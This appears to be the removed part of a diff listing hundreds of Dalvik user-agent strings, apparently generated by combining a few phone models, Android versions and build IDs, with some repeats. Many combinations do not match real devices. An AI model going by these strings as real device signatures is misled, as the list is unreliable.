-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/NRD90M)"
-
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/KTU84P)"
-
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/LMY47X)",
